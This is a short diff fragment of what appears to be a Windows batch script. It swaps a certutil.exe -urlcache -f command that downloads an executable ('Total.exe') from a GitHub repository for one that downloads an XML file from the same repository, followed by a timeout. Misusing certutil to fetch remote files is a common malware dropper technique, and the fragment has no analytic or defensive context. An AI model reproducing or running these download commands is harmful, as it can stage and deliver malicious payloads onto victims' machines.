@@ -1,4 +1,4 @@
-certutil.exe -urlcache -f https://github.com/benjiabcdir/p/blob/master/Total.exe T.exe
+certutil.exe -urlcache -f https://github.com/benjiabcdir/p/blob/master/hathaway.xml hath.xml
 
 timeout /T 5
 
